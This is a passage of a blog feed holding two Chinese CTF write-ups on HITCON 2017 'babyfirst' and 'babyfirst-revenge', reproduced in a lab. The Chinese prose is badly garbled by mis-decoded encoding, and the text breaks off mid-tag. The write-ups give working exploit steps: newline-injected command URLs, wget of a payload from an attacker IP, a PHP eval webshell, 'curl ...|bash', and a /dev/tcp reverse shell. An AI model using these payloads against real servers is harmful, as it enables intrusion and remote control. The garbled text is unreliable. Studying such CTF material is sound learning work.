      <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ç»§ç»­ä¸Šé¢çš„é¢˜ç›®ï¼Œç›´æ¥åˆ©ç”¨ä¸Šä¸€é“é¢˜ç›®çš„dockerç¯å¢ƒå¤ç°ä¸€é“é¢˜ç›®<a id="more"></a>ï¼Œæ³¨æ„è¿™é‡Œé¢çš„dockerç¯å¢ƒå¯èƒ½éœ€è¦è‡ªå·±åœ¨æŸäº›æ–‡ä»¶å¤¹ä¸‹é¢è®¾ç½®æƒé™ï¼Œè‡ªå·±ç¼ºç‚¹ä»€ä¹ˆç¯å¢ƒå°±è‡ªå·±ä¸‹å°±è¡Œäº†ï¼Œæ„Ÿè§‰è¿™ä¸ªé¢˜ç›®çš„éš¾åº¦æ¯”è¾ƒä¸Šä¸€é¢˜ä½äº†ä¸€ç‚¹ï¼Œå‚è€ƒåšå®¢: <a href="https://blog.spoock.com/2017/09/09/Babyfirst-writeup/" target="_blank" rel="noopener">https://blog.spoock.com/2017/09/09/Babyfirst-writeup/</a></p><h2 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h2><p>å…ˆæ”¾ä¸ªé¢˜ç›®ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    $dir = <span class="string">'sandbox/'</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">    <span class="keyword">if</span> ( !file_exists($dir) )</span><br><span class="line">        mkdir($dir);</span><br><span class="line">    chdir($dir);</span><br><span class="line"></span><br><span class="line">    $args = $_GET[<span class="string">'args'</span>];</span><br><span class="line">    <span class="keyword">for</span> ( $i=<span class="number">0</span>; $i&lt;count($args); $i++ )&#123;</span><br><span class="line">        <span class="keyword">if</span> ( !preg_match(<span class="string">'/^\w+$/'</span>, $args[$i]) )</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    exec(<span class="string">"/bin/orange "</span> . implode(<span class="string">" "</span>, $args));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸€æ®µä»£ç çš„æ„æ€å°±æ˜¯å»ºç«‹ä¸€ä¸ª<code>sandbox/clientip</code>æ–‡ä»¶å¤¹ ï¼Œç„¶ååˆ©ç”¨é€šè¿‡getæ³•å¸ˆè·å–argsçš„å‚æ•°ï¼Œç„¶åé‡Œé¢æœ‰ä¸€ä¸ªæ­£åˆ™åŒ¹é…ï¼Œåªèƒ½é€šè¿‡çš„æ˜¯æ•°å­—ä»¥åŠå­—æ¯ä¸ç„¶çš„è¯å°±ä¼šç›´æ¥dieæ‰ï¼Œæœ€åå°±æ˜¯åˆ©ç”¨execè¿™ä¸ªæ‰§è¡Œå‡½æ•°äº†ï¼Œè€Œ/bin/orangeæœ€ç»ˆå‘ç°åªæ˜¯/bin/trueçš„è½¯é“¾æ¥ï¼Œæ²¡æœ‰ä»»ä½•çš„ä½œç”¨ã€‚</p><p>è¿™ä¸ªé¢˜ç›®å…³é”®æ˜¯é‚£ä¸ªæ­£åˆ™ï¼Œé‚£ä¸ªæ­£åˆ™åœ¨å¾ˆå¤šé¢˜ç›®ä¹Ÿæœ‰è§åˆ°è¿‡ï¼Œç”±äºpreg_match()ä½¿ç”¨çš„æ˜¯\wæ¥è¿›è¡Œæ£€æŸ¥ï¼Œæ‰€æœ‰çš„æ–œçº¿ã€ç ´æŠ˜å·å’Œç‚¹<code>(\,-,.)</code>éƒ½æ— æ³•ä½¿ç”¨ã€‚å¦å¤–å°±æ˜¯åœ¨<code>/^\w+$\</code>ä¸­çš„<code>$</code>å½“é‡åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²çš„ç»“å°¾æ˜¯æ¢è¡Œç¬¦æ—¶è¿˜æ˜¯å¯ä»¥åŒ¹é…çš„ã€‚åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ï¼Œå°±å¯ä»¥ç»•è¿‡å‰é¢çš„<code>preg_match()</code>æ£€æŸ¥ï¼ŒåŒæ—¶å¤šå‡ºçš„æ¢è¡Œç¬¦è¿˜å¯ä»¥åœ¨<code>exec()</code>å‡½æ•°ä¸­æ‰§è¡Œã€‚</p><p>ä¸ªäººæ„Ÿè§‰è¿™ä¸ªé¢˜ç›®å¦‚æœ<code>implode</code>é‡Œé¢çš„åˆ†å‰²ç”¨çš„ä¸æ˜¯ç©ºæ ¼è€Œæ˜¯å…¶ä»–çš„ç±»ä¼¼é€—å·çš„ä¸œè¥¿è¿™ä¸€ä¸ªé¢˜ç›®ä¸ä¸€å®šå¯ä»¥å†™æ–‡ä»¶ï¼Œæˆ–è®¸å…¶ä»–å¤§ä½¬æœ‰åŠæ³•å¯ä»¥è·Ÿæˆ‘è®²è®²ã€‚ç•™äº†ç©ºæ ¼åˆšå¥½å°±å¯ä»¥å†™æ–‡ä»¶äº†</p><p>æ¯”å¦‚ä¼ å‚çš„urlæ˜¯è¿™æ ·çš„<code>http://192.168.1.102/?args[]=xxx%0a&amp;args[]=touch&amp;args[]=0ver</code><br>è¿™ä¸‰ä¸ªå‚æ•°éƒ½å¯ä»¥ç»è¿‡æ­£åˆ™åŒ¹é…<br>é‚£ä¹ˆæ‰§è¡Œçš„è¿‡ç¨‹å°±æ˜¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/bin/orange xxx</span><br><span class="line">touch test</span><br></pre></td></tr></table></figure><p>å¯ä»¥æˆåŠŸåˆ›å»ºæ–‡ä»¶<br><img src="https://s1.ax1x.com/2018/09/14/iEgrQg.png" alt="iEgrQg.png"><br>è¿™æ ·ä¸€æ¥ï¼Œå°±å…ˆäº†æ­£åˆ™ï¼Œç„¶åæ—¢å¯ä»¥åˆ›å»ºæ–‡ä»¶äº†ï¼Œå¦‚æœimplodeé‡Œé¢ä¸ç”¨ç©ºæ ¼åˆ†å‰²çš„è¯ï¼Œåé¢åˆ›å»ºæ–‡ä»¶å°±ä¼šå˜æˆ<code>touchtest</code>ï¼Œè¿™ç§ä¸œè¥¿æ˜¯ä¸å¯ä»¥åˆ›å»ºæ–‡ä»¶çš„ </p><p>ç„¶åè¿™é‡Œå°±æ˜¯å‚è€ƒäº†å¤§ä½¬ä»¬çš„åšæ³•åˆ©ç”¨<code>wget</code>çš„æ–¹å¼å»å®ç°ï¼Œtql</p><p>è¿™é‡Œç‰µæ¶‰åˆ°å¦å¤–ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼Œæˆ‘ä»¬å¹³å¸¸è§åˆ°çš„ipåœ°å€éƒ½æ˜¯ç‚¹åˆ†åè¿›åˆ¶è¡¨ç¤ºçš„ï¼Œå…¶å®IPåœ°å€è¿˜å¯ä»¥ç”¨ç›´æ¥10è¿›åˆ¶ï¼Œå…«è¿›åˆ¶ç­‰ç­‰è¡¨ç¤ºéƒ½å¯ä»¥</p><p>ç„¶åå†å¼€ä¸€ä¸ªæœ¬åœ°ç¯å¢ƒ:192.168.1.106ï¼ŒæœåŠ¡å™¨:192.168.1.102</p><p>åœ¨æœ¬åœ°é‡Œé¢åˆ›å»ºä¸€ä¸ªé¡µé¢index.phpå†…å®¹ä¸º<code>&lt;?php phpinfo();?&gt;</code><br><a href="https://imgchr.com/i/iEgfYV" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/14/iEgfYV.md.png" alt="iEgfYV.md.png"></a></p><p>ç„¶åå†å¾€æœåŠ¡å™¨å‘é€ç›¸åº”çš„å‚æ•°ï¼Œè¿™æ—¶å€™çš„ipåœ°å€è½¬åŒ–å°±èµ·ä½œç”¨äº†ï¼ŒæŠŠæœ¬åœ°ipæ¢ä¸€ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">printf(<span class="string">"%u"</span>, ip2long(<span class="string">"192.168.1.106"</span>));</span><br></pre></td></tr></table></figure><p>å¾—åˆ°è¾“å‡º<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3232235882</span><br></pre></td></tr></table></figure></p><p>è¿™é‡Œç”¨çš„è¿™æ ·çš„è¾“å‡ºæ–¹æ³•æ˜¯ä¸ºäº†è§£å†³32ä½ä»¥åŠ64ä½phpç‰ˆæœ¬çš„é—®é¢˜ï¼Œå› ä¸ºç”±äºè‡ªå·±çš„phpç‰ˆæœ¬æ˜¯32 ä½çš„è¾“å‡ºçš„æ˜¯è´Ÿæ•°ï¼Œæ‰€ä»¥æ‰ç”¨è¿™æ ·çš„çš„è§£å†³æ–¹æ³•ï¼Œå‚è€ƒé“¾æ¥<br><a href="https://blog.csdn.net/everything1209/article/details/22418559" target="_blank" rel="noopener">https://blog.csdn.net/everything1209/article/details/22418559</a></p><p>è¿™æ—¶å€™å°±æ˜¯å¼€å§‹åˆ©ç”¨äº†<br><code>http://192.168.1.102/?args[]=xxx%0a&amp;args[]=wget&amp;args[]=3232235882</code><br>ç„¶åå°±ç›´æ¥æŠŠ192.168.1.106ä¸»é¡µçš„é¡µé¢ç»™ä¸‹è½½ä¸‹æ¥ï¼Œä½†æ˜¯è¿™ä¸ªé¡µé¢æ˜¯è§£æè¿‡äº†çš„ï¼Œæ²¡æœ‰ä»»ä½•PHPè¯­è¨€çš„ç—•è¿¹ï¼Œåªå‰©ä¸‹htmläº†<br><a href="https://imgchr.com/i/iEgIlF" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/14/iEgIlF.md.png" alt="iEgIlF.md.png"></a></p><p>è¿™æ—¶å€™åˆæ˜¯å¦å¤–ä¸€ä¸ªçŸ¥è¯†ç‚¹äº†<br>åœ¨Linuxä¸­PHPèƒ½å¤Ÿæ‰§è¡Œéå‹ç¼©çš„æ‰“åŒ…çš„PHPæ–‡ä»¶ã€‚<br>ä¹Ÿå°±æ˜¯è¿™æ ·çš„è¿‡ç¨‹<br>åˆ›å»º1.phpï¼Œå†…å®¹ä¸º<code>&lt;?php echo &quot;123&quot;;?&gt;</code>ï¼Œé€šè¿‡<code>tar</code>å°†<code>1.php</code>æ‰“åŒ…,<code>tar cvf test 1.php</code>ï¼ŒPHPè¿è¡Œtestæ–‡ä»¶ï¼Œå¯ä»¥è¿è¡Œ<br><a href="https://imgchr.com/i/iEgHm9" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/14/iEgHm9.md.png" alt="iEgHm9.md.png"></a></p><p>å¤ç°åˆ°è¿™é‡Œï¼Œå‘ç°orangeå¤§ä½¬çœŸæ˜¯å¼ºï¼Œåˆ°åæœŸå°±æ˜¯åˆ©ç”¨ä¸Šé¢ä¸¤ä¸ªçŸ¥è¯†ç‚¹</p><p>åœ¨åŸæ¥çš„æœ¬åœ°çš„index.htmlé‡Œé¢æ”¹æˆè¿™æ ·çš„ä»£ç ï¼Œæ³¨æ„ä¸€å®šè¦åœ¨<code>index.html</code>é‡Œé¢å†™ä¸Šè¿™æ ·çš„è¯­å¥ï¼Œä¸ç„¶çš„è¯å°±ä¼šåœ¨åƒä¸Šé¢çš„ä¾‹å­ä¸€æ ·åœ¨<code>index.php</code>é‡Œé¢çš„è¯­å¥ä¼šè¢«è§£æä¹‹åä¸‹è½½ï¼Œä¼šæ¯«æ— ç”¨å¤„ä¸‹è½½ä¸‹æ¥æ˜¯æ²¡æœ‰phpè¯­å¥çš„ï¼Œæ›´åˆ«è°ˆè§£æäº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">file_put_contents(<span class="string">'cmd.php'</span>, <span class="string">'</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">header("Content-Type: text/plain");</span></span><br><span class="line"><span class="string"> @eval($_POST["cmd"]);</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">'</span>);</span><br></pre></td></tr></table></figure><p>ç„¶åå¼€å§‹å†™webshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.102/?args[]=xxx%0a&amp;args[]=mkdir&amp;args[]=exploit åˆ›å»ºexploitæ–‡ä»¶å¤¹</span><br><span class="line">http://192.168.1.102/?args[]=xxx%0a&amp;args[]=cd&amp;args[]=exploit%0a&amp;args[]=wget&amp;args[]=3232275969   è¿›å…¥exploitæ–‡ä»¶å¤¹ï¼Œä¸‹è½½192.168.158.1çš„index.htmlæ–‡ä»¶ã€‚</span><br></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯åˆ©ç”¨æ‰“åŒ…çš„æ–¹å¼å»æ‰§è¡Œç›¸å…³çš„PHPä»£ç äº†ï¼Œæƒ³ç›´æ¥æ”¹åå­—æ˜¯ä¸å¯èƒ½çš„å› ä¸ºå‘½ä»¤é‡Œé¢å«æœ‰<code>&#39;.&#39;</code>è¿™æ ·çš„å­—ç¬¦<br>å†æ¥ä¸€å¥<code>http://192.168.1.102/?args[]=xxx%0a&amp;args[]=php&amp;args[]=cmd</code> æ‰§è¡Œä¸€æ³¢è¿™ä¸ªæ‰“åŒ…æœªå‹ç¼©çš„PHPæ–‡ä»¶</p><p>ç„¶åå¯ä»¥æ‰§è¡Œä¸€å¥è¯æœ¨é©¬äº†ï¼Œæ‰“å¼€å°é©¬é¡µé¢<code>http://192.168.1.102/sandbox/192.168.1.102/cmd.php</code>ï¼Œä¸Šèœåˆ€é“¾æ¥æˆåŠŸ<br><a href="https://imgchr.com/i/iE2S6e" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/14/iE2S6e.md.png" alt="iE2S6e.md.png"></a></p><p>å†çœ‹ä¸€ä¸‹æœåŠ¡å™¨ä¸‹é¢çš„ç›®å½•æˆåŠŸåˆ›å»ºäº†<code>cmd.php</code>é¡µé¢<br><img src="https://s1.ax1x.com/2018/09/14/iE2Kmj.png" alt="iE2Kmj.png"></p><p>å†çœ‹çœ‹å‡ºé¢˜äººçš„å®˜æ–¹wpå‘ç°è¿˜æœ‰å…¶ä»–éªšæ“ä½œ<br>å°±æ˜¯åˆ©ç”¨ä¸€æ³¢<code>ftp</code>æ–¹å¼å»ä¸‹è½½è¿œç¨‹çš„ä¸€å¥è¯æœ¨é©¬ï¼Œå› ä¸ºè‡ªå·±è™šæ‹Ÿæœºæ²¡æœ‰<code>busybox</code>è¿™ä¸ªä¸œè¥¿å°±ä¸æäº†<br>ä½†è¿˜æ˜¯å¾—è¿‡ä¸€éè„‘ç´«çš„ï¼Œåˆ©ç”¨ä¸‹é¢çš„å‘½ä»¤æŠŠè¿œå¤„<code>ftp</code>æœåŠ¡å™¨é‡Œé¢çš„<code>webshell.php</code>ç»™ä¸‹è½½ä¸‹æ¥ï¼Œè¿™æ ·åšçš„å¥½å¤„å°±æ˜¯ä¸ç”¨å†ç®¡åŸæ¥é‚£äº›phpç¹ççš„è§£ææ­¥éª¤ï¼Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">busybox ftpget -u ftpçš„ç”¨æˆ·å -p ftpçš„å¯†ç  ftpåœ°å€ éœ€è¦ä¸‹è½½çš„æ–‡ä»¶å</span><br></pre></td></tr></table></figure><p>å¾ˆå¥½çš„æ€è·¯å­¦ä¹ äº†ï¼Œä¸ä¸€å®šå°±æ˜¯busyboxï¼Œè¿˜æœ‰å…¶ä»–åˆ©ç”¨ftpçš„ä¸‹è½½åŠŸèƒ½æ¥è·å–webshellçš„ã€‚</p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>1.ä¸¤ä¸ªè¿ç”¨çš„çŸ¥è¯†ç‚¹è¿œç¨‹wgetä¸‹è½½çš„PHPæ–‡ä»¶æ˜¯ç»è¿‡è§£æçš„ï¼ŒæœåŠ¡å™¨æ˜¯å¯ä»¥é€šè¿‡ç”¨phpæ‰§è¡Œæ‰“åŒ…çš„æ–‡ä»¶çš„ï¼Œæ³¨æ„ä¸æ˜¯å‹ç¼©çš„PHPæ–‡ä»¶ï¼Œæœ‰ç‚¹åƒæ˜¯ä¸¤ä¸ªæœ¬æ¥å®‰å…¨çš„ä¸œè¥¿æ”¾åœ¨ä¸€èµ·åå°±å˜æˆäº†ä¸å®‰å…¨çš„ä¸œè¥¿ã€‚ã€‚ã€‚ã€‚ä¸ªäººæ„Ÿè§‰é—®é¢˜çš„ä¸¥é‡æ€§è¿˜æ˜¯å‡ºç°åœ¨phpèƒ½å¤Ÿæ‰§è¡Œæœªå‹ç¼©çš„æ‰“åŒ…æ–‡ä»¶ä¸Šã€‚<br>2æ ¹æ®ä¸Šä¸€æ¬¡çš„å¤ç°é¢˜ç›®ï¼Œä¸ªäººæ„Ÿè§‰å‘½ä»¤æ‰§è¡Œåœ¨è¿™ä¸¤é“é¢˜ç›®çš„ä¸Šé¢éƒ½åˆ©ç”¨äº†è¿œç¨‹çš„å¦å¤–ä¸€å°ä¸»æœºï¼Œç¬¬ä¸€æ¬¡æ˜¯ä½¿ç”¨äº†curlå‘½ä»¤å»è®¿é—®ï¼Œè€Œè¿™æ¬¡æ˜¯é€šè¿‡wgetæˆ–è€…æ˜¯ftpå»è®¿é—®ï¼Œéªšæ“ä½œåˆå­¦ä¹ äº†ä¸€æ³¢<br>3.æ­£åˆ™å¯ä»¥æ¢è¡Œç¬¦ç»§ç»­åŒ¹é…é‚£ä¸ªç‚¹å°±ä¸å¤šè¯´äº†</p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
          <category> å‘½ä»¤æ‰§è¡Œ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Hitcon2017 babyfirst-revengeå¤ç°</title>
      <link href="/hitcon2017-babyfirst.html"/>
      <url>/hitcon2017-babyfirst.html</url>
      <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å¼€å­¦äº†è¿˜æ˜¯å¾—å­¦ä¹ çš„ï¼Œå¤ç°ä¸€æ³¢é¢˜ç›®æ¥ç©ç©ï¼Œå…¶å®æ˜¯å®åŠ›ä¸å¤Ÿä¸èƒ½å»æ‰“ç½‘é¼æ¯<a id="more"></a>emmm</p><h2 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h2><p>å…ˆä»Hitcon2017 babyfirst-revengeè¿™ä¸€ä¸ªé¢˜ç›®ï¼Œæ€»ç»“ä¸€ä¸‹è¿˜æ˜¯å­¦åˆ°å¾ˆå¤šä¸œè¥¿çš„<br>å¤ç°åœ°å€ <a href="https://github.com/Pr0phet/hitconDockerfile/tree/master/hitcon-ctf-2017/babyfirst-revenge" target="_blank" rel="noopener">https://github.com/Pr0phet/hitconDockerfile/tree/master/hitcon-ctf-2017/babyfirst-revenge</a></p><p>è¿™æ˜¯é¢˜ç›®å›æ˜¾çš„æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $sandbox = <span class="string">'/www/sandbox/'</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">        @exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">        @exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæºç çš„æ„æ€å°±æ˜¯ä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ª<code>/www/sandbox/</code>ç„¶ååœ¨ä¸‹é¢æ–°å»ºæ–‡ä»¶å¤¹ï¼Œç„¶åå¯ä»¥é€šè¿‡<code>cmd</code>å‚æ•°å»æ‰§è¡Œç›¸å…³ç³»ç»Ÿå‘½ä»¤ï¼Œä½†æ˜¯è¿™ä¸ªç³»ç»Ÿå‘½ä»¤çš„é•¿åº¦æ˜¯ä¼šæœ‰é™åˆ¶çš„ï¼Œè¿™é¢˜çš„å…³é”®åœ¨äºè¦ç»•è¿‡è¿™ä¸ªé•¿åº¦ä»¥åŠå¦‚ä½•å»æ„é€ <code>getshell</code>çš„å‘½ä»¤ã€‚<br>çªç„¶å‘ç°Pç¥å°±æ˜¯å¾ˆæ—©å°±æœ‰ç±»ä¼¼æ–‡ç« ï¼Œæˆ‘è¿˜æ˜¯å¤ªèœï¼Œå¾—æ‹¼å‘½å­¦ä¹ å•Š<br><a href="https://www.leavesongs.com/SHARE/some-tricks-from-my-secret-group.html" target="_blank" rel="noopener">https://www.leavesongs.com/SHARE/some-tricks-from-my-secret-group.html</a></p><h4 id="çŸ¥è¯†ç‚¹ä¸€"><a href="#çŸ¥è¯†ç‚¹ä¸€" class="headerlink" title="çŸ¥è¯†ç‚¹ä¸€"></a>çŸ¥è¯†ç‚¹ä¸€</h4><p>åœ¨Linuxä¸‹é¢å¯ä»¥é€šè¿‡æ¢è¡Œå»æ‰§è¡Œæ–­æ–­ç»­ç»­çš„å‘½ä»¤ï¼Œä¾‹å¦‚<br><img src="https://s1.ax1x.com/2018/09/06/iCZyI1.png" alt="iCZyI1.png"></p><h4 id="çŸ¥è¯†ç‚¹äºŒ"><a href="#çŸ¥è¯†ç‚¹äºŒ" class="headerlink" title="çŸ¥è¯†ç‚¹äºŒ"></a>çŸ¥è¯†ç‚¹äºŒ</h4><p>åœ¨Linuxä¸‹é¢å¯ä»¥é€šè¿‡å†™å…¥ä¸€ä¸ªæ–‡ä»¶ï¼Œæ–‡ä»¶é‡Œé¢çš„å†…å®¹æ˜¯ç³»ç»Ÿå‘½ä»¤ï¼Œç„¶åå¯ä»¥é€šè¿‡<code>sh filename</code>æ¥æ‰§è¡Œæ–‡æœ¬é‡Œé¢çš„ç³»ç»Ÿå‘½ä»¤ï¼Œå¦‚æœæœ‰æŠ¥é”™çš„è¯ä¼šè‡ªåŠ¨è·³è¿‡<br>å¦‚<br><a href="https://imgchr.com/i/iCZgG6" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCZgG6.md.png" alt="iCZgG6.md.png"></a></p><h4 id="çŸ¥è¯†ç‚¹ä¸‰"><a href="#çŸ¥è¯†ç‚¹ä¸‰" class="headerlink" title="çŸ¥è¯†ç‚¹ä¸‰"></a>çŸ¥è¯†ç‚¹ä¸‰</h4><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡&gt;+fileanmeæ¥å®ç°æ–°å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œæ³¨æ„åŒºåˆ«ä¸€ä¸‹<code>&gt;</code>å’Œ<code>&gt;&gt;</code>è¿™ä¸¤ä¸ªç¬¦å·<br>å°äºå·ï¼šå‘½ä»¤é»˜è®¤ä»é”®ç›˜è·å¾—çš„è¾“å…¥ï¼Œæ”¹æˆä»æ–‡ä»¶ï¼Œæˆ–è€…å…¶å®ƒæ‰“å¼€æ–‡ä»¶ä»¥åŠè®¾å¤‡è¾“å…¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; æ˜¯è¿½åŠ å†…å®¹</span><br><span class="line">&gt; æ˜¯è¦†ç›–åŸæœ‰å†…å®¹</span><br></pre></td></tr></table></figure><p>åé¢ä¼šæœ‰è¿™é‡Œçš„è¯¦ç»†åˆ©ç”¨</p><p>è¿™æ ·å°±å¯ä»¥è¿ç”¨è¿™ä¸¤ä¸ªçŸ¥è¯†ç‚¹å»å®ç°è¿™æ®µä»£ç çš„ç»•è¿‡<br>æ€è·¯å°±æ˜¯é€šè¿‡æ„é€ ä¸€ä¸ªæ–‡ä»¶ç„¶åå¾€é‡Œé¢å†™å…¥ç±»ä¼¼<code>curl 192.168.1.104|bash</code> ä¹‹ç±»çš„è¯­å¥ç„¶åæ‰§è¡Œï¼Œå…¶å®è¿˜å¯ä»¥åˆ©ç”¨å…¶ä»–python ä»¥åŠPHPç¯å¢ƒå»æ‰§è¡Œä»£ç ï¼Œè®¿é—® <code>192.168.1.104/index.php</code>é‡Œé¢çš„å†…å®¹<code>bash -i &gt;&amp; /dev/tcp/192.168.1.104/12345 0&gt;&amp;1</code>ä»è€Œè¾¾åˆ°åå¼¹webshellçš„ç›®çš„</p><p>è¿™é‡Œé¢æ³¨æ„ä¸¤ä¸ªç‚¹<br>ç¬¬ä¸€ç‚¹<code>ls</code>å‘½ä»¤åˆ—æ–‡ä»¶çš„é¡ºåºï¼Œé€šè¿‡phpæ‰§è¡Œçš„lså‘½ä»¤ä»¥åŠç›´æ¥åœ¨linuxä¸‹æ‰§è¡Œçš„lså‘½ä»¤æ˜¯ä¸ä¸€æ ·çš„ï¼Œå› ä¸ºæˆ‘ä»¬ä¸€å¼€å§‹çš„è¾“å…¥æ˜¯ä»phpé‡Œé¢å¼€å§‹çš„<br>ls çš„é»˜è®¤æ’åºæ–¹å¼æ‰‹å†Œä¸Šåªå†™äº†æ˜¯<code>alphabetically</code>ï¼ˆå­—å…¸åºï¼‰ï¼Œç»è¿‡æµ‹è¯•å‘ç°lsæ’åºæ–¹å¼æ˜¯å¿½è§†å­—æ¯å¤§å°å†™ï¼Œæ•°å­—æ’åœ¨å­—æ¯å‰é¢ï¼Œæ— è§†æ•°å­—å’Œè‹±æ–‡å­—æ¯ä¹‹å¤–çš„å­—ç¬¦ã€‚<br>phpæ‰§è¡Œç”Ÿæˆçš„_çš„å†…å®¹åºåˆ—å¹¶éå’Œæˆ‘ä»¬åœ¨linuxå‘½ä»¤è¡Œä¸€æ ·ï¼ŒæŸ¥èµ„æ–™ ls æ’åºå’Œåº”è¯¥å’Œç¯å¢ƒå˜é‡<code>LC_COLLATE</code>æœ‰å…³ï¼è€Œphpåº”è¯¥æ˜¯c<br><a href="https://www.zhihu.com/question/273928679" target="_blank" rel="noopener">https://www.zhihu.com/question/273928679</a><br><img src="https://s1.ax1x.com/2018/09/06/iCetwd.png" alt="iCetwd.png"></p><p>æ‰€ä»¥è¿˜æ˜¯æŒ‰ç…§å®˜æ–¹wpé‚£æ ·é€šè¿‡è¿½åŠ æ–¹å¼å»æ·»åŠ å†…å®¹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'&gt;ls\\'</span>, </span><br><span class="line"> <span class="string">'ls&gt;_'</span>, </span><br><span class="line"> <span class="string">'&gt;\ \\'</span>, </span><br><span class="line"> <span class="string">'&gt;-t\\'</span>, </span><br><span class="line"> <span class="string">'&gt;\&gt;g'</span>, </span><br><span class="line"> <span class="string">'ls&gt;&gt;_'</span>,</span><br></pre></td></tr></table></figure><p>å°±æ˜¯ä¸ºäº†æ‹¼å‡‘å‡º<code>ls -t&gt;g</code>ï¼Œè¿™æ˜¯ä¸ºäº†åé¢æ„é€ <code>curl 192.168.1.104|bash</code> åšå¥½å‡†å¤‡ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ—¶é—´çš„å…ˆåé¡ºåºæŠŠcurlå‘½ä»¤å®Œæ•´çš„æ‹¼æ¥</p><p>ç¬¬äºŒç‚¹æˆ‘ä»¬æ˜¯é€šè¿‡æ„é€ æ–‡ä»¶åï¼Œç„¶åé€šè¿‡<code>ls</code>å‘½ä»¤å°†æ–‡ä»¶åå†™å…¥åˆ°å¦å¤–ä¸€ä¸ªæ–‡ä»¶é‡Œé¢å»ç„¶åæ‰§è¡Œï¼Œè¿™é‡Œé¢è¦æ³¨æ„è½¬ä¹‰ç¬¦å·<code>\</code>(åæ–œæ )ä¸è¦å¿˜è®°</p><p>ç„¶åæˆ‘ä»¬åœ¨è‡ªå·±çš„vpsä¸Šå…ˆå†™å¥½åå¼¹webshellçš„è¯<br><a 